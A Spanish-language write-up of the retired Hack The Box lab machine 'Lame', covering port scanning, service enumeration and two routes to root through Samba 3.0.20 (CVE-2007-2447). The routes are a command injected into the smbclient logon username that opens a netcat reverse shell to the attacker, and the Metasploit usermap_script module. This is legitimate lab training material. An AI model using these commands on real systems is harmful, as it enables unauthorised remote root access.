---
title: Lame
description: Lame es una máquina Linux que solo necesita un exploit para obtener acceso root. Fue la primera máquina publicada en Hack The Box y, antes de ser retirada, solía ser la primera máquina que los nuevos usuarios enfrentaban.
date: 2024-07-17
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-lame/lame_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - os_command_injection
  - metasploit
  - ftp
  - ssh
  - smb
  - tcp
  - os_command_injection
  - rce
  - information_gathering
  - foothold

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/lame:-$ ping -c 1 10.10.10.3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=303 ms

--- 10.10.10.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 302.848/302.848/302.848/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/lame:-$ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG map1
Host: 10.10.10.3 ()     Status: Up
Host: 10.10.10.3 ()     Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3632/open/tcp//distccd///
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/lame:-$ sudo nmap -sCV -p21,22,139,445,3632 -vvv -oN map2 10.10.10.3
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.92
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-07-16T11:08:59-04:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 7523/tcp): CLEAN (Timeout)
|   Check 3 (port 40169/udp): CLEAN (Timeout)
|   Check 4 (port 42500/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m26s, deviation: 2h49m45s, median: 23s
```

El primer puerto que destaca durante el escaneo es el 21, que ejecuta el servicio FTP vsFTPd 2.3.4. Esta versión es conocida por una backdoor introducida intencionalmente en su código fuente, correspondiente a la vulnerabilidad [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/cve-2011-2523). Existen múltiples exploits disponibles para explotarla, tanto en formato Python como módulo de Metasploit.

```terminal
/home/kali/Documents/htb/machines/lame:-$ nxc ftp 10.10.10.3
FTP         10.10.10.3      21     10.10.10.3       [*] Banner: (vsFTPd 2.3.4)
```
```terminal
/home/kali/Documents/htb/machines/lame:-$ searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                  | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Execution                                                               | unix/remote/49757.py
-------------------------------------------------------------------------------------------------------- ---------------------------------
```

Sin embargo, al intentar ejecutarlos no se obtiene respuesta alguna. Sospecho que un firewall en la máquina objetivo está bloqueando el canal de retorno necesario para establecer la shell inversa, lo que impide completar con éxito el ataque a pesar de que el servicio vulnerable está activo.

---

Durante la enumeración del puerto 445, se confirma que la máquina ejecuta Samba 3.0.20, una versión vulnerable a [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/cve-2007-2447). Esta falla permite la ejecución remota de comandos mediante la mala interpretación de nombres de usuario en el archivo de configuración smb.conf. Varios exploits públicos pueden aprovechar esta condición.

```terminal
/home/kali/Documents/htb/machines/lame:-$ nxc smb 10.10.10.3
SMB         10.10.10.3      445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
```

```terminal
/home/kali/Documents/htb/machines/lame:-$ searchsploit Samba 3.0.20
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                  | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                        | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                   | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                           | linux_x86/dos/36741.py
-------------------------------------------------------------------------------------------------------- ---------------------------------
```

---

Adicionalmente, detecto que el recurso compartido tmp tiene permisos de lectura y escritura, lo que habilita una segunda vía válida de explotación. Este recurso puede ser aprovechado para cargar scripts o binarios maliciosos, permitiendo la ejecución remota de comandos sin necesidad de autenticación previa.

```terminal
/home/kali/Documents/htb/machines/lame:-$ smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

---
## Foothold 1

Aprovecho los permisos de escritura presentes en el recurso compartido `//10.10.10.3/tmp`, utilizo el comando `logon` para inyectar directamente una reverse shell dentro del contexto del servicio Samba, que en esta versión vulnerable `3.0.20` se ejecuta con privilegios de `root`.

```terminal
/home/kali/Documents/htb/machines/lame:-$ nc -lnvp 443     
	listening on [any] 443 ...

/home/kali/Documents/htb/machines/lame:-$ smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
Anonymous login successful
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.16.108 443`"
Password:
```

El payload ejecutado por Samba establece una reverse shell desde el sistema objetivo hacia mi máquina, obteniendo acceso como `root`. Lanzo una shell interactiva para mejorar el entorno de ejecución y accedo directamente a las flags del sistema.

```terminal
	... connect to [10.10.16.108] from (UNKNOWN) [10.10.10.3] 41236
id
uid=0(root) gid=0(root)

script /dev/null -c bash
root@lame:/tmp# cat /home/makis/user.txt
root@lame:/tmp# cat /root/root.txt
```

---
## Foothold 2

Utilizo el módulo `usermap_script` de Metasploit para explotar la vulnerabilidad CVE-2007-2447, presente en Samba 3.0.20. Esta vulnerabilidad permite ejecución remota de comandos sin autenticación mediante la manipulación del parámetro username map script. El servicio Samba interpreta este valor de forma insegura, permitiendo inyección de comandos arbitrarios directamente desde el parámetro de autenticación.

Lanzo Metasploit y configuro el módulo con la IP de la víctima y mi dirección como receptor de la conexión reversa.

```terminal
$ msfconsole

msf6 > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use 0

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.16.108
```

Una vez obtenida la shell remota como `root`, convierto la TTY en interactiva y leo ambas flags.

```terminal
msf6 exploit(multi/samba/usermap_script) > exploit

python -c 'import pty; pty.spawn("/bin/bash")'

root@lame:/# id
uid=0(root) gid=0(root)

root@lame:/# cat /home/makis/user.txt
root@lame:/# cat /root/root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/1" target="_blank">***Litio7 has successfully solved Lame from Hack The Box***</a>
{: .prompt-info style="text-align:center" }